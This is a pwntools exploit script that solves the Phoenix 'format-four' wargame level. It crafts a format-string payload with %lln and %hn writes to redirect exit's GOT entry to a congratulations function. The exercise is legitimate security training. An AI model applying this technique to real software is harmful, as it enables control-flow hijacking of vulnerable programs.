#!/usr/bin/env python3
from pwn import *

path = "/opt/phoenix/amd64/format-four"
context.binary = path
# context.log_level = "debug"

exit_gotplt = 0x6009F0
# congratulations = 0x400644
# LO< | 44 06 | 40 00 | 00 00 | 00 00 | >HI
#      (0x644)  (0x40)
# steps:
# - zero the entire entry
# - write second 16-bit
# - write first 16-bit

count1 = 0x40
count1 = str(count1).encode("ascii")
count2 = 0x644 - 0x40
count2 = str(count2).encode("ascii")

# skip 11 * sizeof(size_t) bytes to reach start of payload
payload = b"%.0s" * 11  # 4 * 11 = 44
# skip ? bytes to reach end of buffer
payload += b"%.0s" * 18  # 4 * ? = ?
# zero the entire GOT entry for exit
payload += b"%lln"  # 4
# print 4 chars
payload += b"%0" + count1 + b"llx"  # 2 + 2 + 3 = 7
# write 0x4000 to changeme+2
payload += b"%hn"  # 3
# print 0x644 - 0x40 chars
payload += b"%0" + count2 + b"llx"  # 2 + 4 + 3 = 9
# write 0x4406 to changeme
payload += b"%hn"  # 3
# padding
payload += b"\x00" * 2  # 3
# addresses...
payload += pack(exit_gotplt)
payload += pack(0xDEADBEEFCAFEBABE)
payload += pack(exit_gotplt + 2)
payload += pack(0xDEADBEEFCAFEBABE)
payload += pack(exit_gotplt)

io = process(path)
print(io.recvline())  # Welcome
io.sendline(payload)
io.recvline()
print(io.recvline())  # result

# need to stop the infinite recursion:
# congratulations() -> exit@plt.got -> congratulations() ...
io.kill()
